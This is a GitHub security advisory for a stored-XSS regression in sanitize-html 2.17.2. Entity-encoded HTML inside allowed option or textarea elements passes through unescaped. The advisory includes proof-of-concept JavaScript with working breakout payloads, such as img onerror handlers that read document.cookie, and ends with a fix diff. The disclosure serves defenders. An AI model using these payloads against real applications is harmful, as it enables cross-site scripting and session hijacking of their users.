# [M] sanitize-html allowedTags Bypass via Entity-Decoded Text in nonTextTags Elements

## Summary
Severity: Medium
Advisory: GHSA-9mrh-v2v3-xpfm
CVE: CVE-2026-40186
CWE: CWE-79
Ecosystem: npm
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-04-16
Source: https://github.com/advisories/GHSA-9mrh-v2v3-xpfm
Type: github-advisory

## Affected
- npm: `sanitize-html` — affected >=2.17.2 <2.17.3

## Details
## Summary

Commit 49d0bb7 introduced a regression in sanitize-html that bypasses `allowedTags` enforcement for text inside `nonTextTagsArray` elements (`textarea` and `option`). Entity-encoded HTML inside these elements passes through the sanitizer as decoded, unescaped HTML, allowing injection of arbitrary tags including XSS payloads. This affects any application using sanitize-html that includes `option` or `textarea` in its `allowedTags` configuration.

## Details

The vulnerable code is at `packages/sanitize-html/index.js:569-573`:

```javascript
} else if ((options.disallowedTagsMode === 'discard' || options.disallowedTagsMode === 'completelyDiscard') && (nonTextTagsArray.indexOf(tag) !== -1)) {
  // htmlparser2 does not decode entities inside raw text elements like
  // textarea and option. The text is already properly encoded, so pass
  // it through without additional escaping to avoid double-encoding.
  result += text;
}
```

The comment is factually incorrect. htmlparser2 10.x **does** decode HTML entities inside both `<textarea>` and `<option>` elements before passing text to the `ontext` callback. This can be verified:

```javascript
const htmlparser2 = require('htmlparser2');
const parser = new htmlparser2.Parser({
  ontext(text) { console.log(JSON.stringify(text)); }
});
parser.write('<option>&lt;script&gt;</option>');
// Outputs: "<", "script", ">"  — entities are decoded
```

Because the code assumes the text is "already properly encoded" and skips `escapeHtml()`, the decoded entities (`<`, `>`) are written directly to the output as literal HTML characters. This completely bypasses the `allowedTags` filter — any tag can be injected inside an allowed `option` or `textarea` element using entity encoding.

The execution flow:
1. Attacker submits: `<option>&lt;img src=x onerror=alert(1)&gt;</option>`
2. htmlparser2 parses and decodes entities → `ontext` receives `<img src=x onerror=alert(1)>`
3. Code at line 569 checks: tag is `option`, which is in `nonTextTagsArray` → true
4. Line 573: `result += text` — writes decoded text directly without escaping
5. Output: `<option><img src=x onerror=alert(1)></option>` — `<img>` tag injected despite not being in `allowedTags`

The `script` and `style` tags are handled separately at lines 563-568 (before the vulnerable block), so the effective vulnerability applies to `textarea` and `option`, plus any custom elements added to `nonTextTags` by the user.

Prior to commit 49d0bb7, text in these elements fell through to the `escapeHtml` branch (line 574-580), which correctly re-encoded the decoded entities.

## PoC

**Prerequisites:** Application using sanitize-html 2.17.2 with `option` or `textarea` in `allowedTags`.

**Step 1: Basic tag injection via option**
```javascript
const sanitize = require('sanitize-html');
const output = sanitize(
  '<option>&lt;script&gt;alert(1)&lt;/script&gt;</option>',
  { allowedTags: ['option'] }
);
console.log(output);
// Expected (safe): <option>&lt;script&gt;alert(1)&lt;/script&gt;</option>
// Actual (vulnerable): <option><script>alert(1)</script></option>
```

**Step 2: Element breakout with XSS event handler**
```javascript
const output2 = sanitize(
  '<option>&lt;/option&gt;&lt;img src=x onerror=alert(document.cookie)&gt;</option>',
  { allowedTags: ['option'] }
);
console.log(output2);
// Output: <option></option><img src=x onerror=alert(document.cookie)></option>
// The <img> tag escapes the option context and executes the onerror handler
```

**Step 3: Textarea breakout (also vulnerable)**
```javascript
const output3 = sanitize(
  '<textarea>&lt;/textarea&gt;&lt;img src=x onerror=alert(1)&gt;</textarea>',
  { allowedTags: ['textarea'] }
);
console.log(output3);
// Output: <textarea></textarea><img src=x onerror=alert(1)></textarea>
```

**Step 4: Full select/option context breakout**
```javascript
const output4 = sanitize(
  '<select><option>&lt;/option&gt;&lt;/select&gt;&lt;img src=x onerror=alert(1)&gt;</option></select>',
  { allowedTags: ['select', 'option'] }
);
console.log(output4);
// Output: <select><option></option></select><img src=x onerror=alert(1)></option></select>
// Breaks out of both option and select elements
```

All outputs verified against sanitize-html 2.17.2 with htmlparser2 10.x.

## Impact

- **Complete `allowedTags` bypass**: Any HTML tag can be injected through an allowed `option` or `textarea` element using entity encoding, defeating the core security guarantee of sanitize-html.
- **Stored XSS**: Applications that sanitize user-submitted HTML and allow `option` or `textarea` tags (common in form builders, CMS platforms, rich text editors) are vulnerable to stored cross-site scripting.
- **Session hijacking**: Attackers can inject event handlers (`onerror`, `onload`, etc.) to steal session cookies or authentication tokens.
- **Scope**: Affects non-default configurations only — the default `allowedTags` does not include `option` or `textarea`. However, these tags are commonly allowed in applications that handle form-related HTML content.

## Recommended Fix

Remove the vulnerable code block at lines 569-573 entirely. The `escapeHtml` branch (line 574) correctly handles these elements — htmlparser2 10.x decodes entities, and re-encoding with `escapeHtml` produces correct HTML output (entities are round-tripped, not double-encoded).

```diff
--- a/packages/sanitize-html/index.js
+++ b/packages/sanitize-html/index.js
@@ -566,11 +566,6 @@ function sanitizeHtml(html, options, _recursing) {
         // your concern, don't allow them. The same is essentially true for style tags
         // which have their own collection of XSS vectors.
         result += text;
-      } else if ((options.disallowedTagsMode === 'discard' || options.disallowedTagsMode === 'completelyDiscard') && (nonTextTagsArray.indexOf(tag) !== -1)) {
-        // htmlparser2 does not decode entities inside raw text elements like
-        // textarea and option. The text is already properly encoded, so pass
-        // it through without additional escaping to avoid double-encoding.
-        result += text;
       } else if (!addedText) {
         const escaped = escapeHtml(text, false);
         if (options.textFilter) {
```

This fix restores the pre-49d0bb7 behavior where all non-script/style text content goes through `escapeHtml()`, ensuring decoded entities are properly re-encoded before output.

## References
- https://github.com/apostrophecms/apostrophe/security/advisories/GHSA-9mrh-v2v3-xpfm
- https://nvd.nist.gov/vuln/detail/CVE-2026-40186
- https://github.com/apostrophecms/apostrophe/commit/7ca2d16237c72718ef7e5c7ae0458e6027ac4f64
- https://github.com/apostrophecms/apostrophe
